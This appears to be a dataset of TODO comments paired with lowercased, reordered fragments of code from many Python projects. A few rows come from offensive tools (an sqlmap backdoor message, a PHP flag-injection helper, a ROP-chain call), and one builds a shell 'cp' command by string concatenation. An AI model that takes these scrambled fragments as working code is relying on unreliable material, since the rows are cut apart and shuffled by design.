# todo we need to add more tests </s> layer.commitchanges()	_remove_rows if isinstance(feature.attributes()[index], QPyNullVariant): layer.deleteFeature(feature.id())
# todo use literal_eval instead of a simple eval. </s> value = eval(label)	_make_label else: assert label[0] in ('"', "'"), label if value[0].isalpha(): if value in self.keywords:
#todo: add way to check if alt is pressed </s> self.currenttool.rotate(blocksonly=true)	key_down self.currentTool.roll(blocksOnly=True) elif keyname == config.config.get('Keys', 'Rotate'): elif keyname == config.config.get('Keys', 'Mirror'): self.currentTool.mirror(blocksOnly=True)
# todo(ohta): convert `study` and `trial` to single objective versions before passing. </s> return self._sampler.sample_independent(study, trial, param_name, param_distribution)	sample_independent param_distribution: BaseDistribution, ) -> Any:
# todo(mitmul): current cupy.random.choice doesn't support replace=false </s> bg_inds = cuda.to_cpu(bg_inds)	_create_bbox_labels bg_inds = xp.where(labels == 0)[0] if len(bg_inds) > num_bg: disable_inds = np.random.choice( bg_inds, size=len(bg_inds) - num_bg, replace=False)
# todo: make the backend lazy and compute things when </s> data["grading"] = [1] * dim	_init_from_Hrepresentation elif data['inhom_inequalities']: dim = len(data['inhom_inequalities'][0]) - 1 self._init_from_normaliz_data(data, verbose=verbose)
# todo: fix this! </s> self.full_name = 'fixme'	LdapAuth self.full_name = '' else: self._logger.debug('successfully authenticated as %s, username %s' % (self.authenticated_as, self.username)) return self._authenticated
# todo: add support for custom likelihoods </s> if any(hasattr(m, "_likelihood_state_dict") for m in models):	_check_compatibility "Conversion of HeteroskedasticSingleTaskGP is currently unsupported." ) raise NotImplementedError( "Conversion of models with custom likelihoods is currently unsupported."
data['type'] = 'query-%s' % editor_type  # todo: add handling for non-sql types </s> data['directoryuuid'] = directory_uuid	create_notebook if editor_type != 'notebook': data['name'] = '' editor.data = json.dumps(data) response['notebook'] = editor.get_data()
# todo: automate detection of max string length to set up numpy array accordingly </s> self.rangednames = np.zeros(shape = (int(self.app.activeworkbook.names.count),1), dtype=[('id', 'int_'), ('name', 's200'), ('formula', 's200')])	get_rangednames def get_rangednames(self): for i in range(0, self.app.ActiveWorkbook.Names.Count): self.rangednames[i]['id'] = int(i+1)
# todo: remove this! compat w/<1 </s> def get_arg_value(state, host, arg):	get_arg_value This functions is **deprecated**. if isinstance(arg, six.string_types):
# todo: review this part one more time </s> vgg_16_keys = vgg_16_variables_mapping.keys()	extract_vgg_16_mapping_without_fc8 Dict which maps the FCN-32s model's variables to VGG-16 checkpoint variables names without fc8 layer mapping. vgg_16_without_fc8_keys = [] for key in vgg_16_keys:
# todo: handle case where the creation is rejected for some reason (should </s> assert 'request_id' in create_response	CrushNodeViewSet if serializer.is_valid(request.method): create_response = self.client.create(fsid, CRUSH_NODE, serializer.get_data()) return Response(create_response, status=status.HTTP_202_ACCEPTED) else:
# todo: add also jsp backdoor/uploader support </s> errmsg  = "jsp web backdoor functionality is not yet "	__webBackdoorInit break elif choice == "3": errMsg += "implemented" raise sqlmapUnsupportedDBMSException, errMsg
# todo: move lifetime to syncpins </s> def oninnerkilled(*args, **kwargs):	onInnerKilled if subgraphInputPin in self.__inputsMap: self.__inputsMap.pop(subgraphInputPin)
# todo: modifiers </s> self._pyvis_canvas.events.key(action='release', key=key, text=text)	on_key_release except Exception: text = ''
pass # todo(denero) implement </s> def test_missing_field(self):	test_missing_field
# todo addding a assertrvline to test reversed selections would make the calls to assertselection() below in this test # noqa: e501 </s> self.assertselection((14, 2))	test_if_backward_vline_and_target_is_before_selection_it_should_extend_selection self.feed('l_%') self.assertVline('x\n|f {\na\nb\nc\n}\n|x\n') self.feed('l_%') self.assertVline(start)
# todo: this needs refactoring </s> if args.metadata_table:  # pragma: no cover	args_download assert args.refseq_category in EDefaults.REFSEQ_CATEGORIES.choices, \ "Unsupported refseq_category: {}".format(args.refseq_category) logging.info('Creating metadata file: %r', args.metadata_table) with open(args.metadata_table, 'wt') as metadata_table:
# todo project_id = 'your google cloud project id' </s> project_resource = 'projects/{}'.format(project_id)	list_assets from google.cloud import asset_v1p5beta1 from google.cloud.asset_v1p5beta1 import enums content_type = enums.ContentType.RESOURCE client = asset_v1p5beta1.AssetServiceClient()
# todo - this should be moved to the `finalize` method of the base resource, as it's not cross-service </s> if 'elb' in self.services:	preprocessing if 's3' in self.service_list and 'iam' in self.service_list: self._match_iam_policies_and_buckets() self._parse_elb_policies() if 'emr' in self.service_list and 'ec2' in self.service_list:
# todo: handle escape (0x1b) </s> for d in data:	decode_out def decode_out(self, data): d = ord(d) if not self.out_parsing and d != kamstrup_constants.RESPONSE_MAGIC:
# todo never test </s> super(multiheadatte, self).__init__()	__init__ def __init__(self, input_size, output_size, key_size, value_size, num_atte): raise NotImplementedError self.in_linear = nn.ModuleList() for i in range(num_atte * 3):
# todo: display correlation error better in graph! </s> if isnan(cur_associations[other.source.name]):	process_associations cur_associations[other.source.name] = \ feature.source.corr(other.source, method='pearson') cur_associations[other.source.name] = 0.0 mirror_association(self._associations, feature_name, other.source.name, \
# todo: use parameterized tests to test all losses. </s> loss_fn = losses_impl.approxndcgloss(name=none, ragged=true)	test_listwise_normalize_weights_with_ragged_tensors per_item_weights = tf.ragged.constant([[2., 3., 4.], [1., 1.]]) with self.cached_session(): weights = loss_fn.normalize_weights(labels, per_item_weights).eval() self.assertAllClose(weights, [[4.], [1.]])
# todo: contains a self argument, should probably be a class method. </s> return (verts, norms, idx, tex_coords, ssize)	lathe print ssize, ss
# todo: replace with copy and copy_file </s> command = "cp -a '" + source + "' '" + target + "'"	_copy_file def _copy_file(source, target): Copy dotfile from $HOME. process = sp.run(command, shell=True, stdout=sp.PIPE) return process
# todo(brian): s/_obj/obj once other changes propogate </s> return self._get(_obj.object, value)	get_object :raises: :class:`~openstack.exceptions.ResourceNotFound` when no resource can be found for this name or id.
# todo: memoize? </s> return sorted(self._data())	_data_sorted def _data_sorted(self):
# todo: should be 2.14 when released </s> if gtk.pygtk_version >= (2, 13, 0):	open_uri def open_uri(uri, timestamp=0): gtk.show_uri(gtk.gdk.screen_get_default(), uri, timestamp) else:
# todo: support other offsets types (time delta, etc.) </s> if on is not none:	get_rolling_setup_args if on is None: raise ValueError("'on' argument to rolling() should be constant string") window = guard(find_const, func_ir, window) if not isinstance(window, str):
# todo: arrange </s> repo = self.remote.new_repo(self.token)	test_create_repo def test_create_repo(self): Test: create/edit a repo object self.assertTrue(self.remote.modify_repo(repo, "name", "testrepo0", self.token)) self.assertTrue(self.remote.modify_repo(repo, "mirror", "http://www.sample.com/path/to/some/repo", self.token))
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
# todo - make this work on loop with more than two links </s> def is_middle(loop):	create_railing loops.extend([l for l in v.link_loops]) loops = list(set(loops)) return loop.link_loop_next in loops and loop.link_loop_prev in loops raildata.colinear_loops.extend(
# todo(toshihikoyanase): remove catch_warnings after gridsampler becomes non-experimental. </s> with warnings.catch_warnings():	tune_min_data_in_leaf param_name = "min_child_samples" param_values = [5, 10, 25, 50, 100] warnings.simplefilter("ignore", category=optuna.exceptions.ExperimentalWarning) sampler = optuna.samplers.GridSampler({param_name: param_values})
#h = heading.parse_heading_from_data(text, self.allowed_todo_states) </s> text = ["* todo this is a test  :hallo:",	test_heading_parsing_with_date_and_body def test_heading_parsing_with_date_and_body(self): 'text' contains valid dates (in the body). "some body text <2011-08-24 Wed>",
# todo extend to nonbinary nodes </s> self._marbl = marbl(self.tpm[1], [n.tpm[1] for n in self.inputs])	marbl return self._marbl else: return self._marbl
# todo: docstring </s> import ptvsd.wrapper	debug def debug(filename, port_num, debug_id, debug_options, run_as): import pydevd sys.argv[1:0] = [
#@todo: this chould be a new command api method. that gets automatically </s> if not attr_name:	_reuse_attr_of_parentCommand Example: reuse 'fylouttoolbar' or propMgr attrs in self. @see: self.command_enter_flyout() print_compact_stack("bug: trying to set an attr with no name "\ "in this command")
# todo: check error location </s> assert result.data == {'nest': none}	test_non_nullable_list_of_nullables assert len(result.errors) == 1 assert result.errors[0].message == 'Cannot return null for non-nullable type.'
# todo: split name and email address </s> to_add = [to.strip() for to in self.__email['cc'].split(',')]	generate_attributes self.add_attributes('to', *to_add) if 'Cc' in self.__email: self.add_attributes('cc', *to_add) if 'Subject' in self.__email:
# todo: enhancing highlighting.get_suspected_range_after_change </s> self.assertequals((0, len(text) - 1), suspected)	xxx_test_suspected_region_for_triples suspected = self.highlighting.get_suspected_region_after_change(text, 12, 13)
#todo migrate to remove this hack </s> expiration = email_verifications[token].get('expiration')	confirm_email_get verified_emails = [] for token in email_verifications: try: email_verifications[token]['confirmed']
svg = apply_template(svg, {"maxpoints":maxpoints, "trdn": trdn, "msg":"", "valuemid":"0.5", "timemid":"10s", "datapoints":"","init_max_y": "false", "max_y": 0, "seconds_scale":0, "y_shift": 0, "zero": 0, "l_y":"", "nodata":"&#xf071;", "avg_upd": 0, "late": "no data stream"}) # todo templating engine </s> else:	plotwh print "GENERATE_ERROR" traceback.print_exc() svg = apply_template(svg, {"MAXPOINTS":MAXPOINTS, "TRDN": trdn, "MSG":"", "VALUEMID":"0.5", "TIMEMID":"10s", "DATAPOINTS":"","INIT_MAX_Y": "false", "MAX_Y": 0, "SECONDS_SCALE":0, "Y_SHIFT": 0, "ZERO": 0, "L_Y":"", "NODATA":"&#xf071;", "AVG_UPD": 0, "LATE": "No data stream"}) # TODO templating engine if width and height: svg = svg.replace('height="210" width="610"', 'height="%s" width="%s"' % (height, width)) # TODO: switch to templating
# todo [cas-27]: remove access token from service validation </s> user = {	make_response_from_ticket if not fullname: fullname = external_credential['id'] 'external_id_provider': external_credential['provider'], 'external_id': external_credential['id'],
# todo support intloguniformdistribution </s> if isinstance(distribution, optuna.distributions.intloguniformdistribution):	_initialize_x0 x0 = {} for name, distribution in search_space.items(): raise NotImplementedError if isinstance(distribution, optuna.distributions.UniformDistribution):
# todo: should we remove the corners, whose normal derivative is not well defined? </s> h = (self.area / n) ** 0.5	uniform_boundary_points def uniform_boundary_points(self, n): nx, ny, nz = np.ceil((self.xmax - self.xmin) / h).astype(int) + 1 x = np.linspace(self.xmin[0], self.xmax[0], num=nx)
# todo : remove arg filename </s> urls = self.auto_inject_phpfile(filename, content)	auto_inject_flag_reaper def auto_inject_flag_reaper(self, filename, content): success_numbers = 0 for url in urls:
# todo: for backward compatibility only, remove if not used anymore </s> def get_project_id(self):	get_project_id return get_project(key='id')
elevation_m = 0 # todo </s> return lat, lon, elevation_m	reverse_terra C = 1.0 / sqrt(1.0 - e2 * (sin(lat) ** 2.0)) lat = arctan2(z + a * C * e2 * sin(lat), R)
# todo: require rewrite </s> if not start_time:	regularize Output: Dict that can be converted into pandas.Series directly by calling pandas.Series(Dict) start_time = self.domain.start() if start_time == -inf:
# todo: process form submission </s> return render_template("admin_add_user.html")	admin_add_user @app.route('/admin/add', methods=('GET', 'POST')) def admin_add_user():
# todo: remove all elements of the list and remove the allowlist </s> allowlist = [	test_no_tf_cond def test_no_tf_cond(): "tensorflow_addons/text/crf.py", "tensorflow_addons/layers/wrappers.py",
# todo: implement trough own logger? </s> if manager.options.details:	verbose_details def verbose_details(self, s): print "+ %-8s %-12s %s" % (self.__current_event, self.__current_module, s)
# todo remove else-branch after deprecating torch<1.9.0 </s> else:	_weight_jac_t_mat_prod if TORCH_VERSION >= VERSION_1_9_0: equation = f"vn...o,n...i->v{'' if sum_batch else 'n'}oi" if self._has_additional_dims(module): d_weight = d_weight.flatten(start_dim=1, end_dim=-2)
# todo: convert local to file uri / path </s> stat = os.stat(path.uri_to_path(track.uri))	run for track in local_updater.load(): try: if int(stat.st_mtime) > track.last_modified: uris_update.add(track.uri)
# todo: this relies on the gnu version of ps (need to fix macos support) </s> if not safe_kill(pid, signal.sigstop):	kill_process_tree :param pid: The pid of the process to signal. :param sig: The signal to send to the processes. return children = system_output("ps --ppid=%d -o pid=" % pid, ignore_status=True,
# todo(dougalm): re-enable once we've tackled the less pendantic bugs </s> assert np.allclose(x, y, rtol=tol, atol=tol), \	check_all_close for x, y in zip(xs, ys): assert x.shape == y.shape "Value mismatch:\n{}\n  vs\n{}\n".format(x, y)
# todo support for urls </s> key = _standardize_path(path)	compile_from_input_dict interface_sources: ContractCodes = {} for path, value in input_dict.get('interfaces', {}).items(): interface_sources[key] = value['content'] output_formats = {}
# todo... do something with this annotation information </s> annotations = {}	materialize if full_method_name == '<listcomp>': full_method_name = 'listcomp_%x' % id(self) if self.annotations: values = []
# todo check if config was successfully updated </s> return shutdowns	shutdown_ip else: self.config(self.config_file, 'shutdown', int(port), switch)
# todo: re-implement </s> failed = self.shelve_session.setdefault('failed', [])	print_failed def print_failed(self): print 'TODO: broken' if not failed: print 'No failed entries recorded'
# todo(qos) add agent extensions exception and catch them here </s> except attributeerror:	delete_port try: extension.obj.delete_port(context, data) LOG.exception( _LE("Agent Extension '%(name)s' failed "
# todo - make sure to handle if there is no abi </s> setattr(self, func['name'], caller_method)	__init__ caller_method = CallerMethod(fn)
# todo: remove this hack when dag info is stored in dir layout. </s> spack.db.get(specs[0])	deactivate if len(specs) != 1: tty.die("deactivate requires one spec.  %d given." % len(specs)) spec = spack.cmd.disambiguate_spec(specs[0]) if not spec.package.activated:
# todo: specify a correct exception subclass. </s> raise exception("nothing for .perform() to do")	perform results_if_failure.append(False) if not self.tasks: if self.start_listener(CONFIG.PORT, key): return results_if_success
# todo(haoyuzhang): remove this monkey patch when xla oom issue is fixed. </s> _monkey_patch_org_assert_broadcastable()	set_config_v2 def set_config_v2(): if FLAGS.enable_xla: tf.config.optimizer.set_jit(True) tf.config.optimizer.set_experimental_options(
# todo:  we might need additional logic comparing the state of git-annex </s> pblshd = ds.repo.copy_to(files=paths,	_publish_dataset lgr.debug("Invoking copy --auto") annex_copy_options += ' --auto' remote=remote, options=annex_copy_options)
# todo symbolic frameworks? </s> assert lengths[axis_name] == axis_length	check_shapes assert isinstance(axis_length, int) if axis_name in lengths: else: lengths[axis_name] = axis_length
# todo pre training and hard update before loop </s> buffer.init_before_sample()	train_agent rewards, steps = initial_exploration(env, buffer, max_step, if_discrete, reward_scale, gamma, action_dim) recorder.update__record_explore(steps, rewards, loss_a=0, loss_c=0) agent.update_parameters(buffer, max_step, batch_size, repeat_times) agent.act_target.load_state_dict(agent.act.state_dict())
# todo: support ps fault-tolerance </s> raise runtimeerror(	get_model ) if len(uninit) > 0: "PS pod %d cannot be initialized" % ps_id )
# todo(yanase): implement maximization. </s> if _direction == structs.studytask.maximize:	optimize else: raise ValueError('Please set either \'minimize\' or \'maximize\' to direction.') raise ValueError( 'Optimization direction of study {} is set to `MAXIMIZE`. '
# todo: check for field </s> remote_model = prop.rel_model	_create_ajax_loader if prop is None: raise ValueError('Model %s does not have field %s.' % (self.model, name)) remote_fields = [] for field in fields:
# todo(tobe): test other runtime containers. </s> runtime="python"	test def test(): basicContainer = basic_container.BasicContainer() user_code_path = "/home/tobe/code/lambda-docker/example/" container_memory="1g"
# todo: @sbharadwajj implement and test </s> raise notimplementederror	ea_jac_t_mat_jac_prod def ea_jac_t_mat_jac_prod(self, module, g_inp, g_out, mat):
# todo: assert that set_step was called. </s> def __init__(self, k_fold=3):	BaseCrossValidation class BaseCrossValidation(MetaStepMixin, MetaStepMixin, BaseStep, ABC): super().__init__() self.k_fold = k_fold
# todo parse </s> workers_ids = request.form['id']	workers_update def workers_update(): status = request.form['status'] workers_list = list_integers_string(workers_ids) for worker_id in workers_list:
# @todo: we should move this to a shared method since filesystem.get_file_name() does it too. </s> original_title = re.sub('\w+', '-', original_title.lower())	main original_title = metadata['title'] if(title_update_status and original_title is not None): original_base_name = metadata['base_name'] remove_old_title_from_name = True
# todo need to pass on the session here </s> return spotify.image(self.image_uri)	image def image(self): :class:`SearchPlaylist`."""
# todo(shoyer): test fails on tpu </s> if jtu.device_under_test() == "tpu":	test_root_scalar def test_root_scalar(self): raise SkipTest("Test fails on TPU") def scalar_solve(f, y):
# todo: alloc_shift </s> b = np.empty_like(a)	_column_pct_change_impl def _column_pct_change_impl(A, shift): numba.stencil(lambda a, b: (a[0]-a[-b])/a[-b], out=B)(A, shift) B[0:shift] = np.nan
# this is the dc dmdsec. @todo: account for other as well. </s> dmdsec = dmdsecs[0]	generateSimpleContentDMDirectUploadPackage outputDipDir = prepareOutputDir(outputDipDir, 'directupload', dipUuid) if len(dmdSecs): else: dmdSec = dmdSecs
# todo: if py3k, override unpickler.find_class(). </s> pass	_load mypickle.find_global = None except AttributeError: self._cache_data = mypickle.load() f.close()
# todo blanket allows may be modified by subsequent denies... -- does policyuniverse handle? </s> if statement["effect"] == "allow":	load_group_policies continue if action == "sts:AssumeRole": role_arns = statement["Resource"] if isinstance(role_arns, str):
# todo: check this out </s> self.git_checkout(active_branch, options="-f")	add_metadata_src_to_handle self.git_add(self._key2filename(key)) self.git_commit("New import branch created.") self.git_merge(src_name)  # TODO!
# todo(dcramer): ideally we could just send the signal to the subprocess </s> self.task.status = taskstatus.failed	_timeout self._logthread.terminate() logging.error('Task(id=%s) exceeded time limit of %ds', self.task.id, self.timeout) self.task.date_finished = datetime.utcnow() db.session.add(self.task)
#todo: delete these following two lines when we default to geomean </s> if self.data_type == 'average':	emailWarning if state == 'regression': option_field = 'geomean_regression_emails' option_field = 'regression_emails' if self.config.has_option(branch, option_field):
# todo: do the computation without the 'sr' enforcement </s> mat_expr = matrix([[mat[i,j].expr(method='sr') for i in range(self._nc)]	jacobian_det raise ValueError("the Jacobian matrix is not a square matrix") mat = self.jacobian() for j in range(self._nc)]) det = mat_expr.det() # the unsimplified determinant
# todo: check rackspace file existence </s> return os.path.isfile(safe_join(filepath, filename))	zip_existing filename=self.download_name(app, ty)
# todo: make these 3-d numpy arrays. </s> term1 = hgxx	evaluate_hessian_external_variables hgxy = [get_hessian_of_constraint(con, x, y) for con in g] hgyy = [get_hessian_of_constraint(con, y) for con in g] term2 = [] for hessian in hgxy:
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
# todo: use parameterized tests to test all losses. </s> loss_fn = losses_impl.pairwisehingeloss(name=none, ragged=true)	test_pairwise_normalize_weights_with_ragged_tensors per_item_weights = tf.ragged.constant([[2., 3., 4.], [1., 1.]]) with self.cached_session(): weights = loss_fn.normalize_weights(labels, per_item_weights).eval() self.assertAllClose(weights, [[[2.], [3.], [4.]],
# todo: check that the birth date is not in the future </s> except valueerror, e:	is_valid try: birth_date = get_birth_date(number) return False return calc_check_digit_pers(number[:-1]) == number[-1]
# todo: remove in favor of a proper per-module selection </s> if args.force_module_branch_type is not none:	_load_settings if args.turbo_mode is not None: Settings.set('turbo_mode', args.turbo_mode) Settings.set('_force_module_branch_type', args.force_module_branch_type) if '_modules' in args:
# todo: set cookie </s> self.send_error(400, explain='unable to load selected theme. the theme cookie was reset, please reload the page.')	theme_loader self.my_sender('text/html', buf.read()) except (IOError, PermissionError):
# todo add an option for preferred file descriptor here </s> try:	_read_in_global_data_with_gets return None, None read_to = self._find_global_address_for_string(data) chain = self.rop.func_call(addr, [read_to]) except RopException:
# todo: implement subdomains for slate tensors </s> if kinfo.subdomain_id != "otherwise":	_organize_assembly_calls indices = split_kernel.indices kinfo = split_kernel.kinfo raise NotImplementedError("Subdomains not implemented.") args = [c for i in kinfo.coefficient_map
# todo(albert): this part of the test is broken because python </s> self.assertequal({ok.info_file, 'q1.py'}, self.listtestdir())	testSingleTest ok.dump_tests(TMP, self.assignment)
# todo test </s> def get_inputs_from_cm(index, connectivity_matrix):	get_inputs_from_cm the given index.""" return tuple(i for i in range(connectivity_matrix.shape[0]) if
# todo: use shlex.quote as soon as a newer python version is available. </s> return pipes.quote(path)	quote @staticmethod def quote(path):
# todo, this is scratch/proto </s> alternatives = redis.lrange(self.key(), 0, -1)	get_alternative def get_alternative(self, client_id): for alternative in alternatives: if REDIS.getbit(_key("participation:{0}:{1}".format(self.name, alternative)), client_id):
# todo: assert </s> self.asserttrue(result)	test_find_distro Test: find a distro object result = self.remote.find_distro({"name": "testdistro0"}, self.token) assert 0
# todo: probably not mutate these foreign attrs - ideally maybe move quite a bit of this method up to fleetstate (maybe in __setitem__). </s> self.known_nodes.checksum = keccak_digest(b"".join(bytes(n) for n in self.sorted_nodes())).hex()	remember_node self._node_ids_to_learn_about_immediately.discard(address) if update_fleet_state: self.known_nodes.updated = maya.now()
# todo: adjust dimension order for tf2 broadcasting </s> p_safe = tf.compat.v1.where(	_compute_2d_sparsemax p = tf.math.maximum( tf.cast(0, logits.dtype), z - tf.expand_dims(tau_z, -1)) tf.math.logical_or( tf.math.equal(k_z, 0), tf.math.is_nan(z_cumsum[:, -1])),
# todo: test for this error </s> try:	parse_if_statement err = "expected keyword 'if'" raise ParserError(err, index, self.tokens, ParserError.GOT) index = self.match_token(index, token_kinds.open_paren) except MatchError:
# todo: warn if field has_choices but not in table.filtering </s> print('creating indexes...', end='', flush=true)	handle end = time.time() print('  done in {:.3f}s.'.format(end - start)) start = time.time() Model.create_indexes()
# todo: see about implementing this via the popcnt instruction on </s> assert isinstance(i, r_uint)	bit_count def bit_count(i): i = i - ((i >> 1) & r_uint(0x55555555)) i = (i & r_uint(0x33333333)) + ((i >> 2) & r_uint(0x33333333))
# todo: remove this ``expectedfailure`` </s> self.assertlistequal(data3, [t1, t2, t3, t4])	test_successful_nested_write_atomic data3 = list(Test.objects.all())
# todo: bytes vs str </s> l = l.decode()	_handle while True: l = yield from reader.readline() if l == "\r\n": break
# todo(pep612): fix for paramspectype </s> if isinstance(tv, paramspectype):	merge_typevars_in_callables_by_name name = tv.fullname if name not in unique_typevars: continue assert isinstance(tv, TypeVarType)
# todo: this is untested. </s> _raise_current_error()	set_client_ca_list copy = _lib.X509_NAME_dup(ca_name._name) if copy == _ffi.NULL: push_result = _lib.sk_X509_NAME_push(name_stack, copy) if not push_result:
# todo: backwards compatibility; remove in favor of class method </s> return str(self.__calibration_directory_from_recording(self._rec_dir))	_calibration_folder @property def _calibration_folder(self):
# todo - this only allows using the default constructor </s> javaopcodes.invokespecial(super_class, '<init>', '()v'),	InitMethod self.add_opcodes( JavaOpcodes.ALOAD_0(), ) else:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_approvees_only def test_pass_approvees_only(self):
# todo increase precision </s> eps = numpy.finfo(float).eps	check_degree ) exact_val = exact(k) alpha = abs(exact_val) * tol + (1e4+tol+exact_val)*eps if abs(exact_val - val) > alpha:
# todo(boris-42): make it work through assertisinstance </s> self.assertequal(str(type(engine_inst)), str(e))	test_get_engine engine_inst = deploy_engine.EngineFactory.get_engine(e.__name__, None)
# todo find out what is best used here! </s> 'preferred_dtype': np.float32}	get_properties 'is_deterministic': True, 'handles_sparse': True,
creator = chain.web3.eth.accounts[0]  # todo: make it possible to override </s> escrow, tx = chain.provider.get_or_deploy_contract(	create Creates an escrow which manages mining chain = blockchain.chain() ESCROW_NAME, deploy_args=[token.get().address] + MINING_COEFF, deploy_transaction={'from': creator})
# todo: fix this </s> return {'languages': self.languages}	to_json_content def to_json_content(self):
# todo: return proper searchable iterator </s> data = {	search_messages Returns: typing.Iterable: Found Message IDs "query": query, "snippetOffset": offset,
# xxx todo: rounding </s> e = []	fcvt def fcvt(ir, instr, arg1, arg2): src = ExprOp('fpconvert_fp%d' % arg1.size, arg2) e.append(ExprAssign(arg1, src))
raise notimplementederror # todo </s> def save(self, item):	save
# todo: migrate to glaziererror </s> _logfatal('failed to build the task list', self._build_info, 4302, e)	RunBuild b.Start(out_file=task_list, in_path=root_path) except builder.ConfigBuilderError as e: try: r = runner.ConfigRunner(self._build_info)
# todo(john sirois): map target.resources in the same way </s> for target in versioned_target_set.targets:	execute_single_compilation genmap.add(source, output_dir, classes) genmap.add(target, output_dir, classes) if is_scalac_plugin(target) and target.classname: basedir = self.write_plugin_info(target)
# todo gdef/lookup markfilteringsets </s> t.table.scriptlist.mapfeatures(featuremap)	_preMerge featureMap = dict(enumerate(t.table.FeatureList.FeatureRecord))
# todo: fix this </s> return cls()	from_json_content @classmethod def from_json_content(cls, value) -> 'FeatureConnector':
uploader.upload_file(file, container='export') # todo: right container folder?! </s> finally:	export_csv memzip = make_onefile_memzip(datafile.name, '%s_task.csv' % name) file = FileStorage(filename='%d_%s_task_csv.zip' % (app.id, name), stream=memzip) datafile.close()
# todo: deleted packages are currently being removed from the search </s> self._test_can('search', self.pkggroupadmin, ['xx', 'rx', 'wx', 'rr', 'wr', 'ww'], entity_types=['package'])	test_search_deleted def test_search_deleted(self): self._test_can('search', self.mrloggedin, ['rx', 'wx', 'rr', 'wr', 'ww'], entity_types=['package']) self._test_cant('search', self.mrloggedin, ['deleted', 'xx'], entity_types=['package'])
# todo partially update stored playlists? </s> len(tracks), position, playlist.name())	tracks_added u'%d track(s) added to position %d in playlist "%s"',
pass  # todo: implement this </s> def numeric_keypad_mode(self):	numeric_keypad_mode
# todo: make the min-max values a setting? </s> queue = gst.element_factory_make('queue')	_Outputs self._tee = gst.element_factory_make('tee') self.add(self._tee) queue.set_property('max-size-buffers', 0) queue.set_property('max-size-bytes', 0)
# todo: @sbharadwajj implement and test </s> raise notimplementederror	_jac_t_mat_prod def _jac_t_mat_prod(self, module, g_inp, g_out, mat):
# todo: force to download it </s> logging.debug(_('%s found in iso pkg cache. copying...'), element['filename'])	start if element['hash'] != md5: logging.warning("MD5 hash of %s does not match!", element['filename']) try: shutil.copy(dst_cache_path, dst_path)
# todo: test me </s> if get_django_features()['caches_singleton']:	get_cache def get_cache(alias): from django.core.cache import caches return caches[alias]
# todo: unit-test this method. </s> return self.unicode(text, encoding)	read text = f.read()
# todo(yanase): update sklearn integration to support v0.22.1 or newer. </s> 'scikit-learn>=0.19.0,<=0.22.0',	get_extras_require 'doctest': [ 'pandas', ], 'document': [
# todo(kan-bayashi): documentation and type hint </s> def searchsorted(bin_locations, inputs, eps=1e-6):	searchsorted bin_locations[..., -1] += eps return torch.sum(inputs[..., None] >= bin_locations, dim=-1) - 1
# todo(b/161332815): make jax actor work with batched or unbatched inputs. </s> rng = state.rng	select_action observation: networks_lib.Observation, state: SimpleActorCoreRecurrentState[RecurrentState]): rng, policy_rng = jax.random.split(rng) observation = utils.add_batch_dim(observation)
if util.pythonise(pipe['wires'][wire]['tgt']['moduleid']) == module_id and pipe['wires'][wire]['tgt']['id'] != '_input' and pipe['wires'][wire]['src']['id'].startswith('_output'): # todo? this equates the outputs </s> kargs["%(id)s" % {'id':util.pythonise(pipe['wires'][wire]['tgt']['id'])}] = steps[util.pythonise(pipe['wires'][wire]['src']['moduleid'])]	build_pipe } for wire in pipe['wires']: if module['type'] == 'loop': kargs["embed"] = steps[util.pythonise(module['conf']['embed']['value']['id'])]
# todo: use widgets.dialog </s> id = wx.messagedialog(self._editor,	_handle_sanity_check_failure def _handle_sanity_check_failure(self): 'ERROR: Data sanity check failed!\n'\ 'Reset changes?',
# todo(ssbarnea): remove that deprecation fallback in 3.1+ </s> pb_rename_map = {"playbook.yml": "converge.yml"}	_get_ansible_playbook :return: object if playbook: basename = os.path.basename(playbook) if basename in pb_rename_map and os.path.isfile(playbook):
# todo xxx graalvm change </s> raise unittest.skiptest("missing threading support")	ThreadedEchoServer def start(self, flag=None): self.flag = flag threading.Thread.start(self) def run(self):
# todo see https://github.com/healthcatalyst/healthcareai-py/issues/276 </s> ('imputation', transformers.dataframeimputer(impute=impute)),	full_pipeline ('remove_DTS_columns', filters.DataframeDateTimeColumnSuffixFilter()), ('remove_grain_column', filters.DataframeColumnRemover(grain_column)), ('null_row_filter', filters.DataframeNullValueFilter(excluded_columns=None)), ('convert_target_to_binary', transformers.DataFrameConvertTargetToBinary(model_type, predicted_column)),
# todo(stephenfin): use a helper </s> return orig_cleanup(_self, _context, _instance, *args, **kwargs)	fake_cleanup self.assertIsNone(_instance.new_flavor)
# todo: make legacy detection non-reliant on side </s> if master_namespace not in original:	_initialize_original_config with open(filepath, 'r') as config: original = yaml.safe_load(config) return {MASTER_NAMESPACE: original} return original
# todo this is a workaround since exceptions are currently not correctly stacked </s> pass	search return self._search(self.pattern, string, pos, default(endpos, -1)) except RuntimeError: return self.__compile_cpython_sre().search(string, pos, default(endpos, maxsize()))
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
# todo: this is untested. </s> raise wantwriteerror()	_handle_bio_errors raise WantReadError() elif _lib.BIO_should_write(bio): elif _lib.BIO_should_io_special(bio): raise ValueError("BIO_should_io_special")
# todo: test size=var, with shape that change from call to call </s> if (mode in ['debug_mode', 'debugmode', 'fast_compile'] or	test_binomial @attr('slow') def test_binomial(): mode == 'Mode' and config.linker in ['py']): sample_size = (10, 50)
# todo: logging belongs in on_tag_added hook </s> if log:	add_tags tag_instance, created = Tag.all_tags.get_or_create(name=tag, system=system) self.tags.add(tag_instance) self.add_tag_log(tag_instance, auth) self.on_tag_added(tag_instance)
#todo - introduce an annotated alignment class? </s> alignment._annotations = annotations	MafIterator assert len(records) == seq_count alignment = MultipleSeqAlignment(records, alphabet) yield alignment in_a_bundle = False
## todo : log error </s> (title, body) = \	_add_function_to_submission except InvenioWebSubmitAdminWarningDeleteFailed, e: user_msg.append(str(e)) _create_configure_doctype_submission_functions_form(doctype=doctype, action=action, user_msg=user_msg) return (title, body)
# xxx todo: rounding </s> e = []	fcvt def fcvt(ir, instr, arg1, arg2): src = ExprOp('fpconvert_fp%d' % arg1.size, arg2) e.append(ExprAssign(arg1, src))
# todo document </s> a = similarity_variable	Dadgostar_Shaw_integral_over_T def Dadgostar_Shaw_integral_over_T(T, similarity_variable): a2 = a*a a11 = -0.3416
# short-circuit. todo: test it. </s> return bool(execute(self.other, contexts))	execute_or return True else:
